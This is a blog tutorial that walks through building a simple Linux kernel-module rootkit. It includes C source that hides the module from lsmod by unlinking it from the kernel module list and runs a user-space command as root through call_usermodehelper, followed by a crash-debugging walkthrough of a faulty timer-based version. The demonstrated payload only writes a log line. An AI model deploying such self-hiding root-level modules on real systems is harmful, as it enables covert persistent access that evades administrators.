---
layout: post
title:  "Simple Rootkit"
date:   2015-10-16 10:16:46 -0700
categories: kernel Rootkit
---

The most intuitive way to write code for linux kernel is to add some code in kernel sources, recompile it and run. This approach is not terribly time consuming because kernel recompilation (even with [cc](https://ccache.samba.org/)) can 'take a little bit amount of time', then you have to reboot device to see the effect.
<!-- more -->
Another way to add your own code and avoid the recompilation and rebooting procedure is to do it in run time. Linux Loadable Kernel Modules LKM is a way to do it, so you can write your own chunk of code and load it to the kernel. A lot of theory about LKM can be found in [LDD3 book](https://lwn.net/Kernel/LDD3/). This book is simply a must have for everyone who wants to become a professional kernel programmers (even though it's not without a flow as at this moment it is out of date with kernel). The kernel is a booming project, attracting wide community, so it is practically impossible to write advanced tutorial that will be up to date longer than a year (or even shorter).
There are some projects on github that try to keep up to date and present examples of linux kernel development with current linux kernel version (have a look at [github](https://github.com/duxing2007/ldd3-examples-3.x/commits/master)), so this can be somewhat helpful too.

The goal of I set for myself here is not to give you a complex knowledge of the subject, but rather to present some tips and highlight details that will be useful in driver development (or modules development), working with other developers codes, or even with debugging and analysis. So lets start with developing something that will be non-trivial but also not tedious and of course will be easily extensible (as a easily extensible I mean from functional and technical point of view). We will develop some code but also we will try to analyze, debug and test everything around sources.
The idea is to create a simple rootkit as a LKM module. By rootkit I understand the link between words root and kit that mean the goal is to have and maintain an access to the root. Rootkit can be interesting because they use some techniques that are close to the kernel and help to understand kernel in a different way rather than as a classic device driver.
We will try to make it invisible and able to make some funny operations. Also we will analyze its behaviour and code.

The whole source, makefile and logs can be found at my gihub repository [low_level_programming](https://github.com/gotoco/low_level_stuff/tree/master/simplest_rootkit)

LKM can be loaded into kernel in example by insmod command, after that there can be show by lsmod command. For example my embedded linux board (Olimex A20) shows:

``` bash
root@a20-olimex:~$ lsmod
Module                  Size  Used by
disp_ump                 850  0
cpufreq_powersave       1242  0
mali_drm                2638  1
cpufreq_stats           5908  0
cpufreq_userspace       3524  0
cpufreq_conservative     5712  0
drm                   213190  2 mali_drm
....
```

So there are a lot of modules already. Our first task is to make our rootkit module invisible. To do this, first we must clean up some kernel structures:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>


static int __init rootkit_init(void)
{
  struct module *mod = THIS_MODULE;
  printk(KERN_INFO "rootkit_mod loading.\n");

  printk(KERN_INFO "rootkit_mod hidind itself.\n");
/* Based at: kernel/module.c
   The mutex is because of risk another referencing to list.
   in kernel/module.c each list_del operation are in mutex
 */
  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);

  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);

static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
```

The first thing to do is to delete rootkit from modules list using **list_del()** function.
To check if the module became invisible compile it and run.

To compile the module we need Makefile:

```bash
KDIR := /usr/src/linux-headers-3.13.0-65-generic/ #HERE your kernel dir for x86
## for embedded boards should be folder with linux sources for board i.e.
#KDIR := /home/gotoco/olimex/A20/linux-sunxi
PWD := $(shell pwd)

obj-m += rootkitmod.o

all:
	make -C $(KDIR) \
                SUBDIRS=$(shell pwd) modules

clean:
	make -C $(KDIR) \
                SUBDIRS=$(shell pwd) clean
```

With make we can simply compile the example for x86 only typing make command

```bash
linux_x86:~$ make
```

If we need cross compile for example for ARM platform, the way to achieve that is to add ARCH and CROSS_COMPILE parameters.

For my A20 board it will look like this:
```bash
linux_x86:~$ make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
```

If the compilation was successful, we will get a rootkitmod.ko file (the *.ko files are dedicated executable code for kernel)
Let's inject this module and see what will happen. I will run my example on an embedded board with linux ARM, but this can be also run on a x86 platform.

```bash
root@a20-olimex:~$ insmod rootkitmod.ko
```

Then let's see if it exist in modules list that we get from lsmod

``` bash
root@a20-olimex:~$ lsmod | grep rootkitmod
root@a20-olimex:~$

```

Nice! lsmod didn't show it so we hid our module. To make sure that rootkit is already in the kernel space, let's check kernel logs:

```bash
root@a20-olimex:~$ dmesg
...
[24212.376904] sunxi_emac sunxi_emac.0: eth0: link up, 100Mbps, full-duplex, lpa 0xCDE1
[90378.868644] rootkit_mod loading.
[90378.874580] rootkit_mod hidind itself.
[90379.891221] rootkit_mod done.
```

Great, our rootkit module is in the kernel space and can't be easily found using lsmod. What can we make in kernel space? The answer is exactly everything we want, but we have to know precisely what and how to achieve our goals (also which structures and functions to use) because kernel is really specific place where software meets hardware and each mistake can crash whole system. So as our next step let's say that we want rootkit to wait specific amount of time after loading, and because we already know linux user space better than kernel, we need to run user space process to operate with linux file system.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>
#include <linux/delay.h>

/*
  Simple user space runner
*/
static int simple_usp_runner(void)
{
  char *argv[] = { "/usr/bin/logger", "root!", NULL };
  static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static int __init rootkit_init(void)
{
  struct module *mod = THIS_MODULE;
  printk(KERN_INFO "rootkit_mod loading.\n");

  printk(KERN_INFO "rootkit_mod hidind itself.\n");

  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);

  msleep(1000);
  simple_usp_runner();

  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);

static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
```

Ok, now we are using the **call_usermodehelper()** function to write to system loger. (What exactly we are doing is run logger with parameter that contain array of chars). The key point is that this process that we run in user space is with root privileges so basically we can do everything that we can do from the root console.

Let's try and then run our example:

```bash
root@a20-olimex:~$ insmod rootkitmod_time_usp.ko
```

We run our second rootkit let's have a look at the system logs to check if our module runs correctly.

```bash
root@a20-olimex:~$ tail -f /var/log/messages

localhost kernel: [   31.817563] [DISP] layer allocated: 0,101
localhost kernel: [  178.496962] rootkit_mod loading.
localhost kernel: [  178.502902] rootkit_mod hidind itself.
localhost logger: root!
localhost kernel: [  179.522694] rootkit_mod done.
```

Ok everything was nice, printk goes into dmesg, "root!" message goes to logger, we created a simple rootkit.
So what can be next.. **msleep()** looks dummy in our cool example, let's replace it with something more awesome, let's create a timer that will asynchronously call our module!

```c
/// Comment to compile but be warned!
WARNING THIS CODE WILL CRASH YOUR SYSTEM! So Do not run it on workstation

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>
#include <linux/delay.h>

static struct timer_list my_timer;

static int simple_usp_runner(void)
{
  char *argv[] = { "/usr/bin/logger", "root!", NULL };
  static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void rootkit_callback(unsigned long data)
{
  printk(KERN_INFO "rootkit_callback (%ld).\n", jiffies);

  simple_usp_runner();
}

static int __init rootkit_init(void)
{
  int ret;  
  struct module *mod = THIS_MODULE;

  printk(KERN_INFO "rootkit_mod setting up the timer.\n");

/*
  Lets setup simple timer. Timer resolution depends on kernel parameters
  but don't dream about anything better than 1Hz.
*/
  setup_timer(&my_timer, rootkit_callback, 0);
  ret = mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));

  if (ret)
    printk(KERN_WARNING "Error in mod_timer\n");

  printk(KERN_INFO "rootkit_mod hidind itself.\n");

  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);


  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);

static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
```

So well do we know timmers that we will be running asynchronously. Lest check this out.. (As you probably saw in the source file this code sample is wrong and it will crash your OS so don not run it on your workstation)

```bash
root@a20-olimex:~$ insmod rootkitmod_wrong.ko
```

Voila! What happened?! Bash just blew up!?

```bash
root@a20-olimex:~$ insmod rootkitmod_wrong.ko
root@a20-olimex:~$ <6>rootkit_callback (105679).

[ 1356.683436] rootkit_callback (105679).
<3>BUG: scheduling while atomic: swapper/1/0/0x00000103

[ 1356.692161] BUG: scheduling while atomic: swapper/1/0/0x00000103
<d>Modules linked in:[ 1356.700006] Modules linked in: cpufreq_powersave cpufreq_powersave cpufreq_stats cpufreq_stats cpufreq_userspace cpufreq_userspace cpufreq_conservative cpufreq_conservative disp_ump disp_ump mali_drm mali_drm drm drm mali mali g_ether g_ether pwm_sunxi pwm_sunxi sun4i_csi0 sun4i_csi0 videobuf_dma_contig videobuf_dma_contig videobuf_core videobuf_core gt2005 gt2005 sun4i_keyboard sun4i_keyboard ledtrig_heartbeat ledtrig_heartbeat leds_sunxi leds_sunxi led_class led_class sunxi_emac sunxi_emac sunxi_gmac sunxi_gmac sunxi_cedar_mod sunxi_cedar_mod 8192cu 8192cu ump ump lcd lcd
[<c0015058>] (unwind_backtrace+0x0/0x134) from [<c058455c>] (__schedule+0x744/0x7d0)
[   48.138925] [<c0015058>] (unwind_backtrace+0x0/0x134) from [<c058455c>] (__schedule+0x744/0x7d0)
[<c058455c>] (__schedule+0x744/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[   48.155359] [<c058455c>] (__schedule+0x744/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
[   48.172310] [<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
[<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)
[   48.190301] [<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)
[<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
[   48.207604] [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
<3>bad: scheduling from the idle thread!
[   48.219858] bad: scheduling from the idle thread!
[<c0015058>] (unwind_backtrace+0x0/0x134) from [<c00611e4>] (dequeue_task_idle+0x1c/0x28)
[   48.232471] [<c0015058>] (unwind_backtrace+0x0/0x134) from [<c00611e4>] (dequeue_task_idle+0x1c/0x28)
[<c00611e4>] (dequeue_task_idle+0x1c/0x28) from [<c0584300>] (__schedule+0x4e8/0x7d0)
[   48.249246] [<c00611e4>] (dequeue_task_idle+0x1c/0x28) from [<c0584300>] (__schedule+0x4e8/0x7d0)
[<c0584300>] (__schedule+0x4e8/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[   48.265760] [<c0584300>] (__schedule+0x4e8/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
[   48.282707] [<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
[<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)
[   48.300695] [<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)
[<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
[   48.317990] [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
<1>Unable to handle kernel NULL pointer dereference at virtual address 00000000
[   48.333650] Unable to handle kernel NULL pointer dereference at virtual address 00000000
<1>pgd = df268000
[   48.343386] pgd = df268000
<1>[00000000] *pgd=5f2c1831[   48.348438] [00000000] *pgd=5f2c1831, *pte=00000000, *pte=00000000, *ppte=00000000, *ppte=00000000
<0>Internal error: Oops: 80000007 [#1] PREEMPT SMP ARM

...
...

[ 1359.513367] [<c00e9de0>] (vfs_read+0x98/0x174) from [<c00ea28c>] (sys_read+0x38/0x78)
[<c00ea28c>] (sys_read+0x38/0x78) from [<c000e980>] (ret_fast_syscall+0x0/0x30)
[ 1359.528222] [<c00ea28c>] (sys_read+0x38/0x78) from [<c000e980>] (ret_fast_syscall+0x0/0x30)
<0>Code: bad PC value
[ 1359.538566] Code: bad PC value
```

.. bad PC value?


That kind of error should not have happened to such linux kernel hackers that we are.. What did go wrong?
Board is dead, didn't respond via serial port, ssh was broken. We definitely killed our OS. But how, module was working correctly, so what did timer to destroy program? Lets debug this problem.
At top of stacktrace logs is **uwind_backtrace** so let's search in the kernel code for this function (in this case it is the ARM specific code, on x86 it will be something different)

```c
void unwind_backtrace(struct pt_regs *regs, struct task_struct *tsk)
{
	struct stackframe frame;

	pr_debug("%s(regs = %p tsk = %p)\n", __func__, regs, tsk);

	if (!tsk)
		tsk = current;

	if (regs) {
		arm_get_current_stackframe(regs, &frame);
		/* PC might be corrupted, use LR in that case. */
		if (!kernel_text_address(regs->ARM_pc))
			frame.pc = regs->ARM_lr;
```

So we definetly corupted our PC, but why? Did the timer have some issues like NULL pointer, or was missconfigured? Lets check it out!

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>

static struct timer_list my_timer;

void rootkit_callback(unsigned long data)
{
  printk(KERN_INFO "rootkit_callback (%ld).\n", jiffies);
}

static int __init rootkit_init(void)
{
  int ret;
  struct module *mod = THIS_MODULE;
  printk(KERN_INFO "rootkit_mod loading.\n");

/*
  Lets setup simple timer. Timer resolution depends on kernel parameters
  but don't dream about anything better than 1Hz.
*/
  setup_timer(&my_timer, rootkit_callback, 0);
  ret = mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));

  if (ret)
    printk(KERN_WARNING "Error in mod_timer\n");

  printk(KERN_INFO "rootkit_mod hidind itself.\n");

  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);

  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);

static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
```

Ok, we have the timer code separated, at this moment the timer only will print *rootkit_callback* in timer callback.
Time to checkout the timer code. If the timer blows up we will be sure that we have made a dummy mistake in configuration, or something like that.


```bash
root@a20-olimex:~$ insmod rootkitmod_time.ko
```

And... No explosion? Lets check the dmesg

```bash
root@a20-olimex:~$ dmesg
...
[   59.812976] my_timer_callback (-24020).
```

Ok, so from that it follows that the timer has been configured correctly, when it shouldn't have. So what next can we check? Let's read a little bit about the **call_usermodehelper** function (by the way we should have done it before we use it, but this would be too easy).

```c kmod.c /kernel/kmod.c
/**
 * call_usermodehelper() - prepare and start a usermode application
 * @path: path to usermode executable
 * @argv: arg vector for process
 * @envp: environment for process
 * @wait: wait for the application to finish and return status.
 *        when UMH_NO_WAIT don't wait at all, but you get no useful error back
 *        when the program couldn't be exec'ed. This makes it safe to call
 *        from interrupt context.
 *
 * This function is the equivalent to use call_usermodehelper_setup() and
 * call_usermodehelper_exec().
 */
int call_usermodehelper(char *path, char **argv, char **envp, int wait)
{
    struct subprocess_info *info;
    gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;

    info = call_usermodehelper_setup(path, argv, envp, gfp_mask,
					 NULL, NULL, NULL);
    if (info == NULL)
        return -ENOMEM;

    return call_usermodehelper_exec(info, wait);
```

So what exactly do **call_usermodehelper** the first thing is it run **call_usermodehelper_setup** to get **subprocess_info**, and then based on this info run **call_usermodehelper_exec**.
Ok, so maybe we should return to our pretty logs rather than debugging kernel.

```bash
[   48.317990] [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
<1>Unable to handle kernel NULL pointer dereference at virtual address 00000000

[   48.333650] Unable to handle kernel NULL pointer dereference at virtual address 00000000
<1>pgd = df268000
```

After few seconds we are can come to understanding that we got NP, **call_usermodehelper_exec** is called from timer and timer is not a process. That makes some further complications, we got timeout from scheduler

```bash

[   48.138925] [<c0015058>] (unwind_backtrace+0x0/0x134) from [<c058455c>] (__schedule+0x744/0x7d0)
[<c058455c>] (__schedule+0x744/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)

[   48.155359] [<c058455c>] (__schedule+0x744/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)

[   48.172310] [<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
[<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)

[   48.190301] [<c0583c04>] (wait_for_common+0xe4/0x138) from [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154)
[<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)

[   48.207604] [<c0049dc0>] (call_usermodehelper_exec+0x140/0x154) from [<bf1b806c>] (0xbf1b806c)
<3>bad: scheduling from the idle thread!

[   48.219858] bad: scheduling from the idle thread!
[<c0015058>] (unwind_backtrace+0x0/0x134) from [<c00611e4>] (dequeue_task_idle+0x1c/0x28)

[   48.232471] [<c0015058>] (unwind_backtrace+0x0/0x134) from [<c00611e4>] (dequeue_task_idle+0x1c/0x28)
[<c00611e4>] (dequeue_task_idle+0x1c/0x28) from [<c0584300>] (__schedule+0x4e8/0x7d0)

[   48.249246] [<c00611e4>] (dequeue_task_idle+0x1c/0x28) from [<c0584300>] (__schedule+0x4e8/0x7d0)
[<c0584300>] (__schedule+0x4e8/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)

[   48.265760] [<c0584300>] (__schedule+0x4e8/0x7d0) from [<c0582a20>] (schedule_timeout+0x1b8/0x220)
[<c0582a20>] (schedule_timeout+0x1b8/0x220) from [<c0583c04>] (wait_for_common+0xe4/0x138)
```

Scheduler runs the **call_usermodehelper_exec** and then it tries to return to the process from which module was called from, we doesn't call it from the process but from timer that is a different mechanism because they are called from ISR.
So we cannot do things in this way. Maybe let's return to our success story module with msleep and see what happens when we try to inserting it twice:

```bash

root@a20-olimex:~$ insmod rootkitmod_time_usp.ko
<6>rootkit_mod loading.
[  113.979175] rootkit_mod loading.
<6>rootkit_mod hidind itself.
[  113.985345] rootkit_mod hidind itself.
<6>rootkit_mod done.
[  115.006433] rootkit_mod done.
root@a20-olimex:~$ insmod rootkitmod_time_usp.ko
<3>rootkitmod_time_usp: module is already loaded
[  116.726735] rootkitmod_time_usp: module is already loaded
Error: could not insert module rootkitmod_time_usp.ko: Invalid parameters
```

What? Our module should be invisible but kernel in some way know that it is already loaded, more over it knows the name of our module! Let's grep kernel code to see how..

```c module.c
static int mod_sysfs_init(struct module *mod)
{
	int err;
	struct kobject *kobj;

	if (!module_sysfs_initialized) {
		pr_err("%s: module sysfs not initialized\n", mod->name);
		err = -EINVAL;
		goto out;
	}

	kobj = kset_find_obj(module_kset, mod->name);
	if (kobj) {
		pr_err("%s: module is already loaded\n", mod->name);
		kobject_put(kobj);
		err = -EINVAL;
		goto out;
	}
```

So **kset_find_obj** knows about our module, and it can make a good homework to figure out why. In the next part of this tutorial we will improve our rootkit and make it more similar to a real rootkit by additional functionalities and error handling.
